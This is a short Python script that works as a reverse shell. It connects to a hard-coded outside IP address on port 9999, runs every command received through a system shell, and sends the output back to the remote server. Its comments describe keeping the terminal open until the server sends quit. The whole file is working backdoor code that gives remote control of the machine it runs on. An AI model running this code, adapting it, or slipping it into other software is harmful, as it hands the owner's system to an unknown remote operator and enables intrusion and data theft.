import socket
import os
import subprocess

s = socket.socket()
host = '142.93.51.208'
port = 9999

s.connect((host,port))
# keeping the terminal constantly open until its turn off by the quit command at the sever side
while True:
    data = s.recv(1024)
# data check
    if data [:2].decode("utf-8") == 'cd':
        os.chdir(data [3:].decode("utf-8"))

#Opeining the terminal

    if len(data) >0:
        cmd = subprocess.Popen(data [:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # visble to client computer
        output_byte =cmd .stdout.read() + cmd.stderr.read()
        output_str= str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"
# sending output to the server, by encoding it to bit
        s.send(str.encode(output_str + currentWD))

        print(output_str)